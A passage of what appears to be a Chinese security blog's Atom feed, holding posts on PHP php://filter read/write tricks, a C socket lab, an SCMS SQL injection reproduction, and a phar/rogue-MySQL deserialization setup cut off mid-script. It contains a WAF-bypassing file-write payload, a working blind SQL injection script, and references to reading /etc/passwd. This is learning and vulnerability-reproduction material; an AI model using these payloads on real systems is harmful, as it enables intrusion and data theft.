        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;在做题的时候遇到web类安卓题目，需要反编译，记录一下。&lt;/p&gt;
&lt;h2 id=&quot;apktool&quot;&gt;&lt;a href=&quot;#apktool&quot; c
      
    
    </summary>
    
      <category term="安全" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="other" scheme="http://yoursite.com/tags/other/"/>
    
  </entry>
  
  <entry>
    <title>PHP filter伪协议的黑魔法</title>
    <link href="http://yoursite.com/2019/09/20/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%9A%84%E9%BB%91%E9%AD%94%E6%B3%95/"/>
    <id>http://yoursite.com/2019/09/20/PHP伪协议的黑魔法/</id>
    <published>2019-09-19T16:17:43.000Z</published>
    <updated>2019-09-19T16:18:14.396Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>经常使用的伪协议，一般用于任意文件读取，有时也可以用于getshell.在双OFF的情况下也可以使用.<br>php://filter是一种元封装器，用于数据流打开时筛选过滤应用。这对于一体式（all-in-one）的文件函数非常有用。<br><strong>格式：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/[read/write]/convert.base64-[encode/decode]/resource=xxx</span><br></pre></td></tr></table></figure></p><h2 id="读操作"><a href="#读操作" class="headerlink" title="读操作"></a>读操作</h2><p>对于include、readfile、file_put_contents等函数，<br>可以利用<code>php://filter/convert.base64-encode/resource=index.php</code>来读取文件内容。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$a = file_get_contents(&quot;php://filter/convert.base64-encode/resource=test.php&quot;);</span><br><span class="line">echo $a;</span><br></pre></td></tr></table></figure></p><p>运行得到base64流<br><img src="/img/1568908781652.png" alt=""></p><h2 id="写操作"><a href="#写操作" class="headerlink" title="写操作"></a>写操作</h2><p>一般网上提到写操作的比较少，但是这个点对于绕过waf是非常重要的。<br>对于写操作，我们可以传入base64字符串来绕过waf，然后利用php伪协议将我们的base64字符串进行解码传入到指定文件。<br>示例代码，需要文件名完全可控，文件内容可能被waf或者部分可控，就可以利用php伪协议。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents($_GET[&apos;filename&apos;], &apos;&lt;?php exit;?&gt;&apos; . $_GET[&apos;content&apos;]);</span><br></pre></td></tr></table></figure></p><p>php的base64解码是每4位一组进行解码，对于非英文数字下划线会跳过，所以<code>&lt;?php exit;?&gt;</code>字符串只匹配到<code>phpexit</code>，因而需要我们拼接一位。<br>假设我们要传入文件内容为<code>&lt;?php phpinfo();</code><br>将该字符串base64编码：<code>PD9waHAgcGhwaW5mbygpOw==</code><br>因此payload：<code>?filename=php://filter/write/convert.base64-decode/resource=1.php&amp;content=APD9waHAgcGhwaW5mbygpOw==</code></p><p>成功将代码注入文件：<br><img src="/img/1568909493284.png" alt=""></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/dubhe-/p/9997842.html" target="_blank" rel="noopener">https://www.cnblogs.com/dubhe-/p/9997842.html</a><br><a href="https://blog.csdn.net/weixin_44304686/article/details/91542750" target="_blank" rel="noopener">https://blog.csdn.net/weixin_44304686/article/details/91542750</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;经常使用的伪协议，一般用于任意文件读取，有时也可以用于getshell.在双OFF的情况下也可以使用.&lt;br&gt;php://filter是一种
      
    
    </summary>
    
      <category term="代码审计" scheme="http://yoursite.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="other" scheme="http://yoursite.com/tags/other/"/>
    
  </entry>
  
  <entry>
    <title>链接</title>
    <link href="http://yoursite.com/2019/09/18/%E9%93%BE%E6%8E%A5/"/>
    <id>http://yoursite.com/2019/09/18/链接/</id>
    <published>2019-09-18T15:57:10.000Z</published>
    <updated>2019-09-18T15:57:10.809Z</updated>
    
    <content type="html"><![CDATA[<p>phpStorm调试：<a href="https://www.php.cn/php-weizijiaocheng-387522.html" target="_blank" rel="noopener">https://www.php.cn/php-weizijiaocheng-387522.html</a><br>短信轰炸：<a href="https://www.anquanke.com/post/id/93878" target="_blank" rel="noopener">https://www.anquanke.com/post/id/93878</a><br>windows defender关闭：<a href="https://www.win7qjb.com/jiaocheng/41093.html" target="_blank" rel="noopener">https://www.win7qjb.com/jiaocheng/41093.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;phpStorm调试：&lt;a href=&quot;https://www.php.cn/php-weizijiaocheng-387522.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.php.cn/php-weizijiaoche
      
    
    </summary>
    
      <category term="资料" scheme="http://yoursite.com/categories/%E8%B5%84%E6%96%99/"/>
    
    
      <category term="other" scheme="http://yoursite.com/tags/other/"/>
    
  </entry>
  
  <entry>
    <title>C语言套接字编程</title>
    <link href="http://yoursite.com/2019/09/18/C%E8%AF%AD%E8%A8%80%E5%A5%97%E6%8E%A5%E5%AD%97%E7%BC%96%E7%A8%8B/"/>
    <id>http://yoursite.com/2019/09/18/C语言套接字编程/</id>
    <published>2019-09-18T14:48:19.000Z</published>
    <updated>2019-09-18T14:48:19.320Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>学校最近布置了个套接字实验，挺有意思的，记录一下。</p><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p><img src="/img/1568816545574.png" alt=""></p><h2 id="服务器端代码"><a href="#服务器端代码" class="headerlink" title="服务器端代码"></a>服务器端代码</h2><p>服务器端，前部分代码大部分都为套路，从while循环开始，正式编程。<br>通过accept函数返回值得到已连接套接字，之后我们都要使用这个套接字与客户端进行通信，同时该函数还会将客户端套接字通过指针进行返回，我们可以通过该套接字获取客户端的信息。<br>如果要退出，直接exit就可以。<br>第二层while对read进行循环，可以循环读取客户端输入的数据，这是一个阻塞函数，当客户端提交数据，将会调用该函数，该函数返回用户输入的字符串长度，而用户输入的字符串是通过指针传到buff值进行返回，要退出循环可以用exit。<br>read之后可以对用户数据进行一系列处理。<br>处理之后，可以用wirte函数进行返回处理的结果，write函数通过已连接套接字通信，第二个值为结果，第三个值为长度。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;sys/socket.h&gt;</span><br><span class="line">#include &lt;netinet/in.h&gt;</span><br><span class="line">#include &lt;arpa/inet.h&gt;</span><br><span class="line"></span><br><span class="line">#define PORT 8888</span><br><span class="line">#define BACKLOG 1</span><br><span class="line">#define MAXDATASIZE 100</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int listenfd, connectfd,i,n,m,sin_size;</span><br><span class="line">struct sockaddr_in server;</span><br><span class="line">struct sockaddr_in client;</span><br><span class="line">socklen_t addrlen;</span><br><span class="line">char buf[MAXDATASIZE],rever[MAXDATASIZE]; </span><br><span class="line"></span><br><span class="line">if((listenfd = socket(AF_INET, SOCK_STREAM, 0)) == -1)</span><br><span class="line">&#123;</span><br><span class="line">perror(&quot;socket() error.&quot;);</span><br><span class="line">exit(1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int opt = SO_REUSEADDR;</span><br><span class="line">setsockopt(listenfd, SOL_SOCKET, SO_REUSEADDR, &amp;opt, sizeof(opt));</span><br><span class="line"></span><br><span class="line">bzero(&amp;server, sizeof(server));</span><br><span class="line">server.sin_family = AF_INET;</span><br><span class="line">server.sin_port = htons(PORT);</span><br><span class="line">server.sin_addr.s_addr = htonl(INADDR_ANY);</span><br><span class="line">if(bind(listenfd, (struct sockaddr *)&amp;server, sizeof(server)) == -1)</span><br><span class="line">&#123;</span><br><span class="line">perror(&quot;Bind() error&quot;);</span><br><span class="line">exit(1); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">if(listen(listenfd, BACKLOG) == -1)</span><br><span class="line">&#123;</span><br><span class="line">perror(&quot;listen() error&quot;);</span><br><span class="line">exit(1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sin_size = sizeof(struct sockaddr_in);</span><br><span class="line">while(1)</span><br><span class="line">&#123;</span><br><span class="line">if((connectfd = accept(listenfd,(struct sockaddr *)&amp;client,&amp;sin_size)) == -1)</span><br><span class="line">&#123;</span><br><span class="line">perror(&quot;accept error.&quot;);</span><br><span class="line">exit(1);</span><br><span class="line">&#125;</span><br><span class="line">printf(&quot;You get a connection from %s:%d\n&quot;,inet_ntoa(client.sin_addr),client.sin_port);</span><br><span class="line">send(connectfd,&quot;Welcome.\n&quot;,22,0);</span><br><span class="line">while((n=read(connectfd,buf,MAXDATASIZE)) &gt;0)</span><br><span class="line">&#123;</span><br><span class="line">if(strcmp(buf,&quot;quit&quot;) == 0)</span><br><span class="line">&#123;</span><br><span class="line">exit(1);</span><br><span class="line">&#125;</span><br><span class="line">printf(&quot;%s\n&quot;,buf);</span><br><span class="line">m=n;</span><br><span class="line">n--;</span><br><span class="line">for(i=0;i&lt;m-1;i++)</span><br><span class="line">&#123;</span><br><span class="line">rever[n-1] = buf[i];</span><br><span class="line">n--;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">rever[m-1] = &apos;\0&apos;;</span><br><span class="line">printf(&quot;Send reverse string:%s\n&quot;,rever);</span><br><span class="line">write(connectfd,rever,m);</span><br><span class="line">&#125;</span><br><span class="line">close(connectfd);</span><br><span class="line">&#125;</span><br><span class="line">close(listenfd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="客户端代码"><a href="#客户端代码" class="headerlink" title="客户端代码"></a>客户端代码</h2><p>connect函数之前，大部分都为套路。<br>getsockname函数功能是获得本地信息，只要传入一个本地套接字id号就可以，返回套接字结构通过指针进行返回，可以通过该套接字结构得到ip地址和端口。<br>getpeername函数功能是获得对方信息，传入的是sock函数返回的套接字<br>之后是while循环，将用户输入通过write函数传送到服务器端，参数为字符串和字符串长度。<br>通过read函数接收服务器端的返回值，最后依然是通过exit进行退出。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;sys/socket.h&gt;</span><br><span class="line">#include &lt;netinet/in.h&gt;</span><br><span class="line">#include &lt;arpa/inet.h&gt;</span><br><span class="line">#include &lt;netdb.h&gt;</span><br><span class="line"></span><br><span class="line">#define PORT 8888</span><br><span class="line">#define MAXDATASIZE 100</span><br><span class="line">#define BACKLOG 1</span><br><span class="line"></span><br><span class="line">int main(int argc,char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">int i,fd,numbytes;</span><br><span class="line">char buf[MAXDATASIZE], sendstr[MAXDATASIZE], recstr[MAXDATASIZE];</span><br><span class="line">struct hostent* he;</span><br><span class="line">struct sockaddr_in server,addr;</span><br><span class="line">socklen_t addr_len; </span><br><span class="line">if(argc !=2)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;Usage: %s &lt;IP address&gt;\n&quot;, argv[0]);</span><br><span class="line">exit(1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if((he = gethostbyname(argv[1])) == NULL)</span><br><span class="line">&#123;</span><br><span class="line">perror(&quot;gethostbyname error.&quot;);</span><br><span class="line">exit(1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)</span><br><span class="line">&#123;</span><br><span class="line">perror(&quot;Create socket failed.&quot;);</span><br><span class="line">exit(1);</span><br><span class="line">&#125; </span><br><span class="line">bzero(&amp;server, sizeof(server));</span><br><span class="line">server.sin_family = AF_INET;</span><br><span class="line">server.sin_port = htons(PORT);</span><br><span class="line">server.sin_addr = *((struct in_addr *)he-&gt;h_addr);</span><br><span class="line">if(i=connect(fd,(struct sockaddr *)&amp;server,sizeof(struct sockaddr)) == -1)</span><br><span class="line">&#123;</span><br><span class="line">perror(&quot;connect failed&quot;);</span><br><span class="line">exit(1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//getsockname and getpeername</span><br><span class="line">socklen_t ret = getsockname(fd,(struct sockaddr *)&amp;addr, &amp;addr_len);</span><br><span class="line">    if(ret == 0)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;getsockname succ:%s:%d\n&quot;, inet_ntoa(addr.sin_addr), ntohs(addr.sin_port));</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;getsockname failed\n&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    ret = getpeername(fd, (struct sockaddr *)&amp;addr, &amp;addr_len);</span><br><span class="line">    if(ret == 0)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;getpeername succ:%s:%d\n&quot;, inet_ntoa(addr.sin_addr), ntohs(addr.sin_port));</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;getpeername failed\n&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    //go </span><br><span class="line">if(((numbytes = recv(fd, buf, MAXDATASIZE, 0)) == -1)) </span><br><span class="line">&#123;</span><br><span class="line">perror(&quot;recv error.&quot;);</span><br><span class="line">exit(1);</span><br><span class="line">&#125;</span><br><span class="line">buf[numbytes] = &apos;\0&apos;;</span><br><span class="line">printf(&quot;Server Message: %s&quot;,buf);</span><br><span class="line"></span><br><span class="line">//翻转 </span><br><span class="line">while(i!=-1)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;Please input a string:&quot;);</span><br><span class="line">scanf(&quot;%s&quot;,sendstr);</span><br><span class="line">if(strcmp(sendstr,&quot;quit&quot;) == 0)</span><br><span class="line">&#123;</span><br><span class="line">write(fd,sendstr,strlen(sendstr)+1);</span><br><span class="line">exit(1);</span><br><span class="line">&#125;</span><br><span class="line">write(fd,sendstr,strlen(sendstr)+1);</span><br><span class="line">read(fd,recstr,MAXDATASIZE);</span><br><span class="line">printf(&quot;%s\n&quot;,recstr);</span><br><span class="line">&#125;</span><br><span class="line">close(fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc -o client2 client2.c</span><br><span class="line">gcc -o server2 server2.c</span><br><span class="line">./client2</span><br><span class="line">./server2</span><br></pre></td></tr></table></figure><p><img src="/img/1568818045072.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.cnblogs.com/tangxin-blog/p/7348558.html" target="_blank" rel="noopener">getsockname和getpeername的使用</a><br><a href="https://wenku.baidu.com/view/7e972bc14693daef5ef73d75.html?tdsourcetag=s_pctim_aiomsg&amp;qq-pf-to=pcqq.c2c" target="_blank" rel="noopener">tcp字符串翻转</a><br><a href="http://cache.baiducontent.com/c?m=9d78d513d9d430a54f9a91697d1dc012694381132ba1d1020ed58438e3732844506793ac56510773d5d20d6d16d8394beb802102301451b18cc9f85dacc885592a9f2644335bdd0705d368b8bd4032b520875b99b869ecad863884ded1c4a95344cb23120b83e7f82b1764bc78861525a4e6c7474f1956f8ac27648c446a79c17e15a1478eb173385b96f6aa001b853795364addf469a73966b412ae141c2347a451e248177d61be183aa9137b57c9b51cfa20734029b24fb1b8&amp;p=9b6fd415d9c846ed02be9b7c5f51&amp;newp=c357d51985cc43ff57e69365174392695803ed653ad1c44324b9d71fd325001c1b69e7be26241402d3c57e6204ac4e59edf13d78301766dada9fca458ae7c4&amp;user=baidu&amp;fm=sc&amp;query=%C8%E7%B9%FB%D3%C3%BB%A7%CA%E4%C8%EB%B5%C4%CA%C7quit%2C%D4%F2%B9%D8%B1%D5%C1%AC%BD%D3&amp;qid=cb971f3a002ac2d8&amp;p1=6" target="_blank" rel="noopener">tcp套接字编程</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;学校最近布置了个套接字实验，挺有意思的，记录一下。&lt;/p&gt;
&lt;h2 id=&quot;题目描述&quot;&gt;&lt;a href=&quot;#题目描述&quot; class=&quot;hea
      
    
    </summary>
    
      <category term="学习" scheme="http://yoursite.com/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="other" scheme="http://yoursite.com/tags/other/"/>
    
  </entry>
  
  <entry>
    <title>SCMS接口处存在sql注入漏洞</title>
    <link href="http://yoursite.com/2019/09/18/SCMS%E6%8E%A5%E5%8F%A3%E5%A4%84%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2019/09/18/SCMS接口处存在sql注入漏洞/</id>
    <published>2019-09-18T03:55:39.000Z</published>
    <updated>2019-09-18T03:55:39.806Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>复现一下最近cms的一些cve，学一些技巧套路。</p><h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>在/scms/js/scms.php中，第184行-208行中<br>直接获取pageid的值，并将其拼接在where子句中，存在SQL布尔盲注<br><img src="/img/1568778656270.png" alt=""></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>正确返回xxx.jpg<br><img src="/img/1568778786376.png" alt=""><br>错误不返回xxx.jpg<br><img src="/img/1568778809783.png" alt=""><br>编写python脚本注入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line"></span><br><span class="line">url = &quot;http://127.0.0.1/js/scms.php&quot;;</span><br><span class="line">payload_len = &quot;1\nand\nlength(database())&lt;%d\n#&quot;</span><br><span class="line">payload = &quot;1\nand\nascii(substr(database(),%d,1))&lt;%%d\n#&quot;</span><br><span class="line"></span><br><span class="line">true_str = &quot;20151019102732946.jpg&quot;</span><br><span class="line"></span><br><span class="line">def getOneData(payload,flag=1):</span><br><span class="line">if flag==1:</span><br><span class="line">list = range(50)</span><br><span class="line">else:</span><br><span class="line">list = range(32,127)</span><br><span class="line">low = 0</span><br><span class="line">high = len(list)-1</span><br><span class="line">while low&lt;=high: </span><br><span class="line">mid = (int)((low+high)/2)</span><br><span class="line">guess = list[mid]</span><br><span class="line">print(list[low],guess,list[high])</span><br><span class="line"># print((payload % guess).replace(&apos; &apos;,&apos;%0A&apos;))</span><br><span class="line">data = &#123;&apos;action&apos;:&apos;jssdk&apos;,&apos;pageid&apos;:(payload % guess).replace(&apos; &apos;,&quot;%0A&quot;),&apos;pagetype&apos;:&apos;text&apos;,&#125;</span><br><span class="line">html = requests.post(url,data).text</span><br><span class="line"># print(html)</span><br><span class="line">if true_str in html:</span><br><span class="line">high = mid - 1</span><br><span class="line">else:</span><br><span class="line">low = mid + 1</span><br><span class="line">if low &gt; high:</span><br><span class="line">return list[high]</span><br><span class="line"></span><br><span class="line">def getFlag(length,payload):</span><br><span class="line">result = &apos;&apos;</span><br><span class="line">for l in range(1,length+1):</span><br><span class="line">payload2 = payload % l</span><br><span class="line">result += chr(getOneData(payload2,2))</span><br><span class="line">print(result)</span><br><span class="line"></span><br><span class="line">getFlag(getOneData(payload_len),payload)</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;复现一下最近cms的一些cve，学一些技巧套路。&lt;/p&gt;
&lt;h2 id=&quot;原理分析&quot;&gt;&lt;a href=&quot;#原理分析&quot; class=&quot;head
      
    
    </summary>
    
      <category term="代码审计" scheme="http://yoursite.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="other" scheme="http://yoursite.com/tags/other/"/>
    
  </entry>
  
  <entry>
    <title>phar+mysql client触发反序列化本地复现</title>
    <link href="http://yoursite.com/2019/09/11/phar+mysql%20client%E8%A7%A6%E5%8F%91%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9C%AC%E5%9C%B0%E5%A4%8D%E7%8E%B0/"/>
    <id>http://yoursite.com/2019/09/11/phar+mysql client触发反序列化本地复现/</id>
    <published>2019-09-11T02:10:47.000Z</published>
    <updated>2019-09-11T02:10:47.291Z</updated>
    
    <content type="html"><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>用户请求mysql_client端，client会连接mysql server服务器，mysql server服务器读取<code>phar://phar.gif/test.txt</code>，使得client端执行<code>load client data...</code>的sql语句读取phar文件，触发反序列化。</p><h2 id="mysql-client端脚本"><a href="#mysql-client端脚本" class="headerlink" title="mysql_client端脚本"></a>mysql_client端脚本</h2><p>my_ubuntu<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class TestObject &#123;</span><br><span class="line">public function __destruct() &#123;</span><br><span class="line">echo &apos;Destruct called&apos;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$m = mysqli_init();</span><br><span class="line">mysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, true);</span><br><span class="line">$s = mysqli_real_connect($m, &apos;192.168.169.147&apos;, &apos;root&apos;, &apos;root&apos;, &apos;test&apos;, 3306);</span><br><span class="line">$p = mysqli_query($m, &apos;select * from test&apos;);</span><br></pre></td></tr></table></figure></p><h2 id="伪造mysql-server端脚本"><a href="#伪造mysql-server端脚本" class="headerlink" title="伪造mysql_server端脚本"></a>伪造mysql_server端脚本</h2><p>ubuntu16.04 2<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">#coding: utf8</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">def my_len(s):</span><br><span class="line">    return chr(len(s)+1)</span><br><span class="line"># linux :</span><br><span class="line">#filestring = &quot;/etc/passwd&quot;</span><br><span class="line"># windows:</span><br><span class="line">#filestring = &quot;C:\\Windows\\system32\\drivers\\etc\\hosts&quot;</span><br><span class="line">HOST = 